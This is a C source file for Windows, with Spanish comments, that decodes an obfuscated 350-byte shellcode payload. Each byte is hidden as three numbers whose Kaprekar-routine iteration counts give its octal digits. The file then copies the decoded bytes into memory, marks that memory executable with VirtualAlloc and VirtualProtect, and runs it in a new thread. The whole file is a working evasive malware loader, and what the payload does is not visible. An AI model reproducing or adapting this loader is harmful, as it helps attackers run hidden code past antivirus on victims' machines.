
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>

typedef struct {
	short base;
	short middle;
	short top;
}kaprekarUnit; 

void mitoa(short k, char* number) { //convierte numeros enteros a caracteres

	while (k >= 1000) {
		k -= 1000;
		number[0]++;
	}
	while (k >= 100) {
		k -= 100;
		number[1]++;
	}
	while (k >= 10) {
		k -= 10;
		number[2]++;
	}
	while (k > 0) {
		k--;
		number[3]++;
	}
}

void bubble(char* number) { //bubble sort para ordenar los caracteres numericos de menos a mayor
	bool finish = false;
	while (!finish) {
		finish = true;
		for (short i = 0; i < 3; i++) {
			if (number[i] > number[i + 1]) {
				finish = false;
				number[i] = number[i] ^ number[i + 1];
				number[i + 1] = number[i] ^ number[i + 1];
				number[i] = number[i] ^ number[i + 1];
			}
		}
	}
}

void invert(char* number) { //reordena los caracteres numericos de mayor a menor
	number[0] = number[0] ^ number[3];
	number[3] = number[0] ^ number[3];
	number[0] = number[0] ^ number[3];

	number[1] = number[1] ^ number[2];
	number[2] = number[1] ^ number[2];
	number[1] = number[1] ^ number[2];
}

short matoi(char* number) { //convierte cadena de caracteres numericos decimales en un entero de dos bytes
	short n = 0;

	n += (number[0] - 48) * 1000;
	n += (number[1] - 48) * 100;
	n += (number[2] - 48) * 10;
	n += (number[3] - 48);

	return n;
}

short kaprekar(short n) { //recupera un componente octal codificado contando el numero de iteraciones de la rutina de Kaprekar que produce el input
	short a, b, k, reps = 0;
	k = n;
	if (k != 0 && k != 1111 && k != 2222 && k != 3333 && k != 4444 && k != 5555 && k != 6174 && k != 6666 && k != 7777 && k != 8888 && k != 9999) {
		char number[] = { 48,48,48,48,0 };
		while (k != 6174) {
			mitoa(k, number);
			bubble(number);
			b = matoi(number);
			invert(number);
			a = matoi(number);

			k = a - b;

			reps++;
			number[0] = 48;
			number[1] = 48;
			number[2] = 48;
			number[3] = 48;
		}
	}
	return reps;
}

unsigned char kaprekarDecode(kaprekarUnit input) { //recupera los tres componentes octales de cada byte y los asigna para recuperar el byte original
	unsigned char output = 0;
	unsigned char inter = 0;
	inter = (unsigned char)kaprekar(input.top);
	inter = inter << 6;
	output = inter | output;
	inter = kaprekar(input.middle);
	inter = inter << 3;
	output = inter | output;
	inter = kaprekar(input.base);
	output = inter | output;
	return output;
}

int main(void) {

	void* alloc_mem;
	BOOL retval;
	HANDLE threadHandle;
	DWORD oldprotect = 0;

	kaprekarUnit encodedPayload[] = {
		{0xf85,0x18a8,0x121b},{0x15b3,0x5bb,0xd43},{0x1cf4,0x0,0x1f92},{0x3c5,0x19c4,0xc30},{0xd05,0x58e,0x1278},{0x24cb,0x2159,0xb6},
		{0xddb,0x131a,0x52b},{0x1dc1,0xc86,0x1ad7},{0x1e61,0x881,0x740},{0x15b3,0x2194,0x211a},{0x1e61,0x1e61,0x1a0a},
		{0x0,0x181e,0x22b8},{0x1a0a,0x1a0a,0x457},{0x14f0,0x0,0x25a6},{0x2041,0xe87,0x87e},{0x2036,0x181e,0x9ea},
		{0x8ae,0x77b,0x936},{0x1f44,0x1f65,0xbc8},{0x1be6,0x213e,0x8ec},{0xc60,0x1501,0x21f5},{0x1a0a,0x6d2,0x18cd},
		{0x108,0x129e,0x8ae},{0xc44,0x30f,0x11c2},{0x522,0xda2,0x1952},{0x1a0a,0x18fa,0x2053},{0x22d5,0x2053,0x1077},
		{0xff8,0x596,0x1515},{0x181e,0xb5e,0x1ce3},{0x1770,0x1f66,0x181e},{0x457,0x168b,0x13ac},{0x2059,0x1d5d,0x1336},
		{0x18e6,0x637,0xa2c},{0x22b8,0xba6,0x457},{0x150f,0xca8,0xd05},{0x8ae,0x14c5,0x1348},{0x2007,0x1234,0x1174},
		{0xedf,0x176d,0x1cbf},{0x181e,0x8a1,0x1e61},{0x4a7,0x1105,0x8ae},{0x22b8,0x1868,0x16bf},{0x1edb,0x202b,0x2467},
		{0x106c,0x23c,0x1bc9},{0x22b8,0x22d9,0x1651},{0x6db,0x177c,0xd05},{0x1e61,0x9a7,0xfe2},{0xd91,0xf92,0x181e},
		{0x2156,0x14c7,0x44},{0x413,0x21bf,0x203d},{0x791,0x936,0xb1e},{0x16f8,0x27b,0x3e},{0x4df,0x268c,0x1e61},
		{0x14a3,0x1eac,0x22ab},{0x15b3,0xdfe,0xb08},{0x191c,0x2ca,0x15b3},{0x1e61,0xd05,0x14c},{0x21a8,0x21d2,0xc53},
		{0x1e65,0x939,0x457},{0x1b1f,0x1dec,0x1dd9},{0x2360,0x68d,0x1aba},{0x510,0x8ae,0x22b8},{0xde,0x142a,0x22b8},
		{0x1e61,0x812,0x1e61},{0x1838,0x1e61,0x260b},{0x2032,0x181e,0x969},{0x1c07,0xcd5,0xc8d},{0xe33,0x55b,0x457},
		{0x124a,0x0,0xf5f},{0x12fe,0x181e,0x1e61},{0x1dd9,0x22b8,0x26be},{0x12c8,0xfea,0x16ac},{0x25f2,0x659,0x1bb2},
		{0x1916,0x1eae,0x2048},{0x1506,0x8ae,0x18fa},{0x1439,0xb2c,0x218},{0xf1a,0x815,0xd05},{0x181e,0x1d2,0x204c},
		{0x2524,0x1b16,0x1416},{0x6cb,0x1fc1,0x266c},{0x457,0x1876,0x115c},{0x1a46,0x24f9,0x0},{0x19eb,0x27b,0x547},
		{0x109b,0x15b3,0xf80},{0x1df1,0x190d,0x115c},{0x181e,0x10ac,0xf1d},{0x26c,0xd05,0x181e},{0x1e61,0x2135,0x13d7},
		{0x113e,0xfb7,0x115c},{0x1c74,0x1b47,0x1fab},{0x15b3,0x22b8,0x2206},{0x115c,0xdd3,0x1fd6},{0x181e,0x22b8,0x1a0a},
		{0x1a0a,0x22b8,0x457},{0xd05,0x0,0x457},{0x1a0a,0xfe2,0x25d3},{0xb98,0x22b8,0x1b49},{0xd05,0x15b3,0x3d5},
		{0x270d,0x7cf,0x4df},{0x2608,0x20a6,0x99c},{0x15b3,0x2041,0xe83},{0x2048,0x1e61,0x457},{0x0,0x2560,0x2415},
		{0x0,0x40a,0x18a1},{0x1f82,0x883,0x181e},{0x9b9,0x1363,0x17f1},{0x15b3,0x1868,0x14ba},{0x8ae,0x1516,0x22b8},
		{0x1d85,0xbe5,0x15b3},{0x1a6f,0x181e,0x260b},{0x6b2,0x1ce,0xff8},{0x0,0x0,0x15fe},{0x1e61,0x2579,0x457},
		{0x1d73,0x18ce,0xa7c},{0xa58,0x1e61,0x1e61},{0x1a0a,0xc6b,0x167},{0x6ca,0x257f,0x141c},{0x1ed,0x148,0x1bfc},
		{0x22b8,0x1793,0x810},{0x2cf,0x222,0xe32},{0x6d9,0x1aba,0x1570},{0x222e,0x1a5,0x1e61},{0x1439,0x22b8,0x10af},
		{0x2f8,0xbc8,0x1916},{0x24de,0x51e,0x115c},{0x22b8,0x1788,0x5e4},{0x457,0x5c4,0x1f03},{0x169,0x457,0x1e61},
		{0x1425,0xe5a,0x2045},{0x11d,0xde8,0x233},{0x9b6,0xd21,0x1a0a},{0x233,0x1f39,0x1be0},{0x115c,0x124a,0x5c0},
		{0x863,0xd18,0xd05},{0x22b8,0x457,0x9f7},{0x40,0x81d,0x109b},{0xc58,0x457,0xe83},{0x1234,0x115c,0x71c},
		{0x17a5,0xc55,0xa5a},{0x1d4f,0x1476,0x457},{0xf8b,0x1a0a,0xe6e},{0x13c7,0x15b3,0x181e},{0xa7c,0x115c,0x174},
		{0x181e,0x204b,0x22b8},{0x1a0a,0x2314,0x1735},{0xf55,0x184d,0xce},{0x1860,0x7c2,0x22c9},{0x208d,0xf8d,0x8ae},
		{0x88e,0xb34,0x1982},{0x132b,0x1e61,0x15b3},{0xa5f,0x1e23,0x1788},{0x19a7,0x2124,0x457},{0x181e,0x1c49,0x15b3},
		{0x128a,0xd05,0x87e},{0x1d5d,0xa0d,0x15b3},{0x1bc9,0x1bc4,0x1da6},{0x15bd,0x91f,0x10ac},{0x1509,0x26df,0x2cb},
		{0x457,0x246f,0x1755},{0xbca,0x9f4,0x181e},{0xbe9,0x8ae,0x1b47},{0x2125,0x24a3,0x15dd},{0x1e61,0x115c,0x427},
		{0x19ff,0x1a41,0x0},{0x191c,0xa17,0x1435},{0xf6a,0x0,0x8ae},{0x115c,0x21f7,0x14a2},{0x1464,0x15e9,0x1e23},
		{0x683,0x6e7,0x15b3},{0x55b,0x22b8,0x2489},{0x100a,0x25a6,0x23a8},{0x1ae8,0x1793,0x115c},{0x22b8,0x97c,0x1803},
		{0x71a,0x23c9,0x115c},{0x953,0x181e,0x16c3},{0x18b6,0x205e,0x1a4e},{0x15b3,0x22b8,0x1ce},{0x261d,0x316,0x0},
		{0x1731,0x16f0,0x10a4},{0xa80,0x1a0a,0x181e},{0x1a0a,0x5fb,0xf60},{0x26f3,0x1c7a,0x22b8},{0x1bc9,0xd05,0x1dd9},
		{0x132a,0x106e,0x1f92},{0x4b1,0xd05,0x1e61},{0x0,0xdb2,0x1f87},{0x115c,0x4df,0x9a7},{0x6ef,0x1e61,0x115c},
		{0x181e,0xba5,0xdd7},{0x108,0x15b3,0x1b1a},{0x15b3,0x135,0x2020},{0xf8b,0x1a0a,0x1d59},{0x8ae,0x9ca,0x164},
		{0x17de,0x982,0x202b},{0x1234,0x811,0x54d},{0x219a,0x16eb,0x1d2},{0x18a1,0x8ae,0x9b2},{0x115c,0x1ce8,0x6c3},
		{0x1476,0x0,0x9ea},{0x11fa,0xb3f,0x2041},{0x6b1,0xd05,0x14ba},{0x1421,0x1eee,0x6c7},{0x181e,0xeaf,0x601},
		{0x16be,0x22b8,0x65d},{0x8c0,0xa8a,0x292},{0x1e61,0x1ed2,0x8ae},{0x1515,0x1a0a,0x14fb},{0x6f4,0x19bd,0x1a3a},
		{0x24a2,0x11f5,0x4a1},{0x22b8,0x1bcb,0x185e},{0x181e,0xfc5,0x13c},{0x1651,0x22b8,0x298},{0x21ea,0x1459,0x1ae2},
		{0x11e2,0xeb1,0xea7},{0x7c7,0x61e,0x115c},{0x0,0xe42,0x17b0},{0x1b51,0x99c,0x23ca},{0x217e,0x2232,0x15b3},
		{0xb08,0x256d,0x1a3f},{0x1be6,0x11fe,0xb29},{0x99d,0xa57,0x1bd5},{0x765,0x3b6,0x25ce},{0x11c5,0x675,0x4d7},
		{0x1a30,0xf86,0x1b1f},{0x13a9,0x1bd3,0x181e},{0x0,0x1982,0xa12},{0x1bd8,0x214f,0xf1e},{0x192f,0x1111,0x22d2},
		{0x898,0x8ae,0x1214},{0x14ba,0x22b8,0x181e},{0x115c,0x457,0x181e},{0x115c,0x1e61,0x1e61},{0x1788,0x115c,0xab5},
		{0x23e0,0x12a,0x17f1},{0x164f,0x24aa,0x248d},{0x139d,0x1200,0x6c3},{0x9b4,0x20f7,0x1a0a},{0x31,0xd05,0x1e61},
		{0x79e,0x961,0x1ec7},{0x2092,0x577,0x31b},{0x88,0x1b16,0x15fe},{0x1c63,0x1e61,0x205d},{0xfe2,0x181e,0xf66},
		{0x8ae,0x1e61,0xef1},{0x115c,0x0,0x1a0a},{0x181e,0x0,0x1a0a},{0x457,0x1e61,0xd05},{0x1140,0x1480,0x0},
		{0x1a0a,0x28d,0x24f7},{0xdab,0x88,0x7fc},{0x1b68,0x1954,0x43d},{0xa3b,0x213c,0x1e61},{0x80c,0x8ae,0x8ae},
		{0x15b3,0xd05,0x457},{0x181e,0x22b8,0x1e61},{0x731,0xf9e,0x0},{0x25ff,0x126c,0x24f7},{0xb9c,0x26f5,0x1778},
		{0x1f91,0x181e,0x7b5},{0x115c,0xefa,0xd05},{0x6ce,0x0,0xd05},{0x457,0x1e61,0x457},{0x1a0a,0xd05,0x181e},
		{0x0,0x1ce3,0x1aed},{0xb34,0x26ee,0xd05},{0x25ab,0xea7,0x1fc6},{0x1860,0x457,0x20a0},{0x1cbd,0x4b4,0xdf9},
		{0x136e,0xd05,0x18fe},{0x244d,0x1a0a,0x23ca},{0x533,0x1ac0,0x298},{0x59b,0x1e61,0x457},{0x10db,0x15fa,0x1ae},
		{0x1e3e,0x54,0x153b},{0x1ec9,0x20e9,0x1b7e},{0x0,0x3e6,0xbf3},{0x13ce,0x1e5,0x0},{0x1b6a,0x11c0,0x8ae},
		{0x5e4,0x971,0x1a0a},{0x1eff,0x1e61,0x19f0},{0xdb7,0x25cb,0x18e6},{0x1d0,0x23a0,0xd94},{0x2184,0x1316,0x56},
		{0x6c0,0x9c4,0x1ae4},{0xa90,0x1fe2,0x1404},{0x1a9,0x3ee,0x1a81},{0x136e,0x1a8,0x1c47},{0x22b8,0x7fe,0x1511},
		{0x2452,0x457,0x1404},{0x2314,0x1e61,0x10d3},{0x0,0xf8e,0x1a0a},{0x23fa,0x70e,0x0},{0x677,0x181e,0x1a0a},
		{0x65,0x22f5,0xe09},{0x1dab,0x1be6,0x15b3},{0x22b8,0x181e,0x21f7},{0x58f,0xc5,0xe84},{0x8ae,0x8e9,0x23fb},
		{0x179f,0xe47,0xe09},{0x14bb,0x15b3,0x115c},{0x1c47,0x237c,0xd94},{0x38a,0xd05,0xc22},{0x2258,0xdb7,0x1e61},
		{0x6cb,0x1fa7,0x1ce3},{0x225b,0x115d,0x270},{0x7b3,0x1593,0x25a2},{0xd05,0x115c,0x181e},{0xa50,0x102a,0x1348},
		{0xb08,0x1e61,0x1cf8},{0x1cb7,0x1eac,0xa56},{0x1a57,0x86b,0x1688},{0x1baa,0x158a,0xfc6},{0x1379,0x17c2,0x19fe},
		{0x0,0x227a,0xb1a},{0x7de,0x11f6,0x1363},{0x1798,0x217f,0x810},{0x1cbf,0x228a,0xe11},{0x181e,0x2014,0x1a0a},
		{0x1a0a,0x1911,0x21b4},{0x550,0x89c,0x1d6b},{0x24eb,0x2360,0xea7},{0x416,0x253c,0x1890},{0x127f,0x0,0x1d5d},
		{0xa54,0x457,0x18a1},{0x1e35,0x25d3,0x25a6},{0xf6a,0x38d,0x115c},{0x457,0x115c,0x457},{0xd05,0x22e8,0x14d0},
		{0x26a6,0x24ce,0x266c},{0x14e0,0x1c9e,0x1b1f},{0x1c8f,0xb44,0x1079},{0x1e61,0x1a27,0x457},{0x457,0xf80,0x20cc},
		{0x112c,0x1e98,0xb1a},{0x2180,0x46,0x260b},{0x7e5,0x2153,0x11fe},{0x19cd,0x115c,0x593},{0x24ea,0xd05,0x22e8},
		{0xba1,0xa50,0xf9d},{0x1927,0x100e,0x115c},{0x15b3,0x22b8,0x115c},{0x1a09,0x13df,0x21bf},{0x36c,0x1960,0x87e},
		{0x2227,0x19a5,0x18fa},{0x10c,0x1704,0x204c},{0xa4e,0x253b,0x457},{0x575,0x3f5,0x181e},{0x18f2,0x1807,0x0},
		{0x15db,0x14c1,0x951},{0x231e,0x1828,0x625},{0xb72,0x1f5e,0x2303},{0x0,0x8ae,0x1e61},{0x1e61,0x115c,0x457}
	};

	unsigned char shellcodePayload[350];
	unsigned int lengthOfshellcodePayload = 350;

	for (int i = 0; i < sizeof(shellcodePayload); i++) {
		shellcodePayload[i] = kaprekarDecode(encodedPayload[i]);
	}

	alloc_mem = VirtualAlloc(0, lengthOfshellcodePayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	RtlMoveMemory(alloc_mem, shellcodePayload, lengthOfshellcodePayload);


	retval = VirtualProtect(alloc_mem, lengthOfshellcodePayload, PAGE_EXECUTE_READ, &oldprotect);

	if (retval != 0) {
		threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)alloc_mem, 0, 0, 0);
		WaitForSingleObject(threadHandle, -1);
	}

	return 0;
}
